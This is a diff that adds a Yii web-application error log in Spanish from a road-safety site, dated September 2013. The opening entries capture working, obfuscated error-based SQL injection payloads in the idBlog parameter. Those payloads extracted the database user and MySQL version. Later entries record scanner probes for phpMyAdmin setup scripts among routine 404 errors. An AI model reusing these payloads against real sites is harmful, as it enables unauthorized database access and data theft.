@@ -1,0 +1,328 @@
+2013/09/03 01:55:34 [error] [system.db.CDbCommand] CDbCommand::fetchAll() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!wwwintel_fpv@localhost!~!1' for key 'group_key'. The SQL statement executed was: SELECT * FROM `contenido` `t` WHERE  idContenido = '137' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/uSeR(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1' AND activo=1 order By fecha_creacion DESC.
+in /home/wwwintel/public_html/protected/controllers/IndexController.php (642)
+in /home/wwwintel/public_html/protected/controllers/IndexController.php (162)
+in /home/wwwintel/public_html/index.php (13)
+2013/09/03 01:55:34 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand falló al ejecutar la sentencia SQL: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!wwwintel_fpv@localhost!~!1' for key 'group_key'. The SQL statement executed was: SELECT * FROM `contenido` `t` WHERE  idContenido = '137' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/uSeR(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1' AND activo=1 order By fecha_creacion DESC' in /home/wwwintel/public_html/framework/db/CDbCommand.php:528
+Stack trace:
+#0 /home/wwwintel/public_html/framework/db/CDbCommand.php(390): CDbCommand->queryInternal('fetchAll', Array, Array)
+#1 /home/wwwintel/public_html/framework/db/ar/CActiveRecord.php(1291): CDbCommand->queryAll()
+#2 /home/wwwintel/public_html/framework/db/ar/CActiveRecord.php(1410): CActiveRecord->query(Object(CDbCriteria), true)
+#3 /home/wwwintel/public_html/protected/controllers/IndexController.php(642): CActiveRecord->findAll(Object(CDbCriteria))
+#4 /home/wwwintel/public_html/protected/controllers/IndexController.php(162): IndexController->getBlogInterna(NULL)
+#5 [internal function]: IndexController->actionCategoria('blog_interna')
+#6 /home/wwwintel/public_html/framework/web/actions/CAction.php(107): ReflectionMethod->invokeArgs(Object(IndexController), Array)
+#7 /home/wwwintel/public_html/framework/web/actions/CInlineAction.php(48): CAction->runWithParamsInternal(Object(IndexController), Object(ReflectionMethod), Array)
+#8 /home/wwwintel/public_html/framework/web/CController.php(309): CInlineAction->runWithParams(Array)
+#9 /home/wwwintel/public_html/framework/web/filters/CFilterChain.php(134): CController->runAction(Object(CInlineAction))
+#10 /home/wwwintel/public_html/framework/web/filters/CFilter.php(41): CFilterChain->run()
+#11 /home/wwwintel/public_html/framework/web/CController.php(1146): CFilter->filter(Object(CFilterChain))
+#12 /home/wwwintel/public_html/framework/web/filters/CInlineFilter.php(59): CController->filterAccessControl(Object(CFilterChain))
+#13 /home/wwwintel/public_html/framework/web/filters/CFilterChain.php(131): CInlineFilter->filter(Object(CFilterChain))
+#14 /home/wwwintel/public_html/framework/web/CController.php(292): CFilterChain->run()
+#15 /home/wwwintel/public_html/framework/web/CController.php(266): CController->runActionWithFilters(Object(CInlineAction), Array)
+#16 /home/wwwintel/public_html/framework/web/CWebApplication.php(283): CController->run('categoria')
+#17 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('index/categoria')
+#18 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#19 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#20 {main}
+REQUEST_URI=/index/categoria/blog_interna?idBlog=137'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,%2f**%2fuSeR(),0x217e21))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.inteligenciavial.com/index/categoria/blog_interna?idBlog=137'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,%2f**%2fuSeR(),0x217e21))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2013/09/03 01:55:34 [error] [system.db.CDbCommand] CDbCommand::fetchAll() failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.1.70-cll!~!1' for key 'group_key'. The SQL statement executed was: SELECT * FROM `contenido` `t` WHERE  idContenido = '137' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1' AND activo=1 order By fecha_creacion DESC.
+in /home/wwwintel/public_html/protected/controllers/IndexController.php (642)
+in /home/wwwintel/public_html/protected/controllers/IndexController.php (162)
+in /home/wwwintel/public_html/index.php (13)
+2013/09/03 01:55:34 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand falló al ejecutar la sentencia SQL: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.1.70-cll!~!1' for key 'group_key'. The SQL statement executed was: SELECT * FROM `contenido` `t` WHERE  idContenido = '137' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1' AND activo=1 order By fecha_creacion DESC' in /home/wwwintel/public_html/framework/db/CDbCommand.php:528
+Stack trace:
+#0 /home/wwwintel/public_html/framework/db/CDbCommand.php(390): CDbCommand->queryInternal('fetchAll', Array, Array)
+#1 /home/wwwintel/public_html/framework/db/ar/CActiveRecord.php(1291): CDbCommand->queryAll()
+#2 /home/wwwintel/public_html/framework/db/ar/CActiveRecord.php(1410): CActiveRecord->query(Object(CDbCriteria), true)
+#3 /home/wwwintel/public_html/protected/controllers/IndexController.php(642): CActiveRecord->findAll(Object(CDbCriteria))
+#4 /home/wwwintel/public_html/protected/controllers/IndexController.php(162): IndexController->getBlogInterna(NULL)
+#5 [internal function]: IndexController->actionCategoria('blog_interna')
+#6 /home/wwwintel/public_html/framework/web/actions/CAction.php(107): ReflectionMethod->invokeArgs(Object(IndexController), Array)
+#7 /home/wwwintel/public_html/framework/web/actions/CInlineAction.php(48): CAction->runWithParamsInternal(Object(IndexController), Object(ReflectionMethod), Array)
+#8 /home/wwwintel/public_html/framework/web/CController.php(309): CInlineAction->runWithParams(Array)
+#9 /home/wwwintel/public_html/framework/web/filters/CFilterChain.php(134): CController->runAction(Object(CInlineAction))
+#10 /home/wwwintel/public_html/framework/web/filters/CFilter.php(41): CFilterChain->run()
+#11 /home/wwwintel/public_html/framework/web/CController.php(1146): CFilter->filter(Object(CFilterChain))
+#12 /home/wwwintel/public_html/framework/web/filters/CInlineFilter.php(59): CController->filterAccessControl(Object(CFilterChain))
+#13 /home/wwwintel/public_html/framework/web/filters/CFilterChain.php(131): CInlineFilter->filter(Object(CFilterChain))
+#14 /home/wwwintel/public_html/framework/web/CController.php(292): CFilterChain->run()
+#15 /home/wwwintel/public_html/framework/web/CController.php(266): CController->runActionWithFilters(Object(CInlineAction), Array)
+#16 /home/wwwintel/public_html/framework/web/CWebApplication.php(283): CController->run('categoria')
+#17 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('index/categoria')
+#18 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#19 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#20 {main}
+REQUEST_URI=/index/categoria/blog_interna?idBlog=137'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+HTTP_REFERER=http://www.inteligenciavial.com/index/categoria/blog_interna?idBlog=137'+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+'1'='1
+---
+2013/09/03 02:11:15 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "robots.txt"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('robots.txt')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/robots.txt
+---
+2013/09/03 02:11:16 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "pdf/comportamiento_seguridad.pdf"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('pdf/comportamie...')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/pdf/comportamiento_seguridad.pdf
+---
+2013/09/03 04:00:29 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "robots.txt"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('robots.txt')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/robots.txt
+---
+2013/09/03 04:52:27 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "robots.txt"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('robots.txt')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/robots.txt
+---
+2013/09/03 06:06:54 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "infografiacasco.html"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('infografiacasco...')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/infografiacasco.html
+---
+2013/09/03 06:36:52 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "manager/html"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('manager/html')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/manager/html
+---
+2013/09/03 07:07:33 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "muieblackcat"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('muieblackcat')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/muieblackcat
+---
+2013/09/03 07:07:33 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "phpMyAdmin/scripts/setup.php"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('phpMyAdmin/scri...')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=//phpMyAdmin/scripts/setup.php
+---
+2013/09/03 07:07:33 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "phpmyadmin/scripts/setup.php"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('phpmyadmin/scri...')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=//phpmyadmin/scripts/setup.php
+---
+2013/09/03 07:07:33 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "pma/scripts/setup.php"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('pma/scripts/set...')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=//pma/scripts/setup.php
+---
+2013/09/03 07:07:33 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "myadmin/scripts/setup.php"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('myadmin/scripts...')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=//myadmin/scripts/setup.php
+---
+2013/09/03 07:07:33 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "MyAdmin/scripts/setup.php"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('MyAdmin/scripts...')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=//MyAdmin/scripts/setup.php
+---
+2013/09/03 07:26:24 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "robots.txt"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('robots.txt')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/robots.txt
+---
+2013/09/03 07:43:48 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "robots.txt"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('robots.txt')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/robots.txt
+---
+2013/09/03 07:57:30 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "robots.txt"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('robots.txt')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/robots.txt
+---
+2013/09/03 08:59:38 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "robots.txt"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('robots.txt')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/robots.txt
+---
+2013/09/03 09:42:49 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "robots.txt"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('robots.txt')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/robots.txt
+HTTP_REFERER=http://www.inteligenciavial.com/
+---
+2013/09/03 10:11:22 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'El sistema no ha podido encontrar la acción "img" solicitada.' in /home/wwwintel/public_html/framework/web/CController.php:484
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CController.php(271): CController->missingAction('img')
+#1 /home/wwwintel/public_html/framework/web/CWebApplication.php(283): CController->run('img')
+#2 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('form/img/bt-fb....')
+#3 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#4 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#5 {main}
+REQUEST_URI=/form/img/bt-fb.png
+HTTP_REFERER=http://www.inteligenciavial.com/form/create
+---
+2013/09/03 11:01:03 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "robots.txt"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('robots.txt')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/robots.txt
+---
+2013/09/03 11:01:03 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "robots.txt"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('robots.txt')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/robots.txt
+---
+2013/09/03 11:01:24 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "robots.txt"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('robots.txt')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/robots.txt
+---
+2013/09/03 11:04:41 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "iconoGrande.jpg"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('iconoGrande.jpg')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/iconoGrande.jpg
+---
+2013/09/03 11:15:37 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "pdf/alcochol.pdf"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('pdf/alcochol.pd...')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/pdf/alcochol.pdf
+---
+2013/09/03 11:39:51 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "robots.txt"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('robots.txt')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/robots.txt
+---
+2013/09/03 11:47:19 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'El sistema no ha podido encontrar la acción "img" solicitada.' in /home/wwwintel/public_html/framework/web/CController.php:484
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CController.php(271): CController->missingAction('img')
+#1 /home/wwwintel/public_html/framework/web/CWebApplication.php(283): CController->run('img')
+#2 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('form/img/bt-fb....')
+#3 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#4 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#5 {main}
+REQUEST_URI=/form/img/bt-fb.png
+HTTP_REFERER=http://inteligenciavial.com/form/create
+---
+2013/09/03 11:47:26 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'El sistema no ha podido encontrar la acción "img" solicitada.' in /home/wwwintel/public_html/framework/web/CController.php:484
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CController.php(271): CController->missingAction('img')
+#1 /home/wwwintel/public_html/framework/web/CWebApplication.php(283): CController->run('img')
+#2 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('form/img/bt-fb....')
+#3 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#4 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#5 {main}
+REQUEST_URI=/form/img/bt-fb.png
+HTTP_REFERER=http://inteligenciavial.com/form/create
+---
+2013/09/03 11:56:33 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "multimediafiles/foto_carrucel.jpg"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('multimediafiles...')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/multimediafiles/foto_carrucel.jpg
+HTTP_REFERER=http://www.inteligenciavial.com/multimedia/admin
+---
+2013/09/03 11:56:38 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'No es posible resolver la solicitud "robots.txt"' in /home/wwwintel/public_html/framework/web/CWebApplication.php:287
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('robots.txt')
+#1 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#2 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#3 {main}
+REQUEST_URI=/robots.txt
+---
+2013/09/03 12:02:29 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'El sistema no ha podido encontrar la acción "img" solicitada.' in /home/wwwintel/public_html/framework/web/CController.php:484
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CController.php(271): CController->missingAction('img')
+#1 /home/wwwintel/public_html/framework/web/CWebApplication.php(283): CController->run('img')
+#2 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('form/img/bt-fb....')
+#3 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#4 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#5 {main}
+REQUEST_URI=/form/img/bt-fb.png
+HTTP_REFERER=http://inteligenciavial.com/form/create
+---
+2013/09/03 12:10:14 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'El sistema no ha podido encontrar la acción "img" solicitada.' in /home/wwwintel/public_html/framework/web/CController.php:484
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CController.php(271): CController->missingAction('img')
+#1 /home/wwwintel/public_html/framework/web/CWebApplication.php(283): CController->run('img')
+#2 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('form/img/bt-fb....')
+#3 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#4 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#5 {main}
+REQUEST_URI=/form/img/bt-fb.png
+HTTP_REFERER=http://www.inteligenciavial.com/form/create
+---
+2013/09/03 12:18:19 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'El sistema no ha podido encontrar la acción "img" solicitada.' in /home/wwwintel/public_html/framework/web/CController.php:484
+Stack trace:
+#0 /home/wwwintel/public_html/framework/web/CController.php(271): CController->missingAction('img')
+#1 /home/wwwintel/public_html/framework/web/CWebApplication.php(283): CController->run('img')
+#2 /home/wwwintel/public_html/framework/web/CWebApplication.php(142): CWebApplication->runController('form/img/bt-fb....')
+#3 /home/wwwintel/public_html/framework/base/CApplication.php(162): CWebApplication->processRequest()
+#4 /home/wwwintel/public_html/index.php(13): CApplication->run()
+#5 {main}
+REQUEST_URI=/form/img/bt-fb.png
+HTTP_REFERER=http://www.inteligenciavial.com/form/create
+---
